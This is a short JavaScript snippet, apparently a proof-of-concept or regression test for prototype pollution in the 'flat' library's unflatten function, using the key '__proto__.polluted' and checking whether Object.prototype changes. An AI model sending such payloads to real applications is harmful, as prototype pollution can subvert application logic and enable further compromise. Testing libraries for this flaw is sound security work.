var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var unflatten = require('flat').unflatten;
console.log({}.polluted);
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);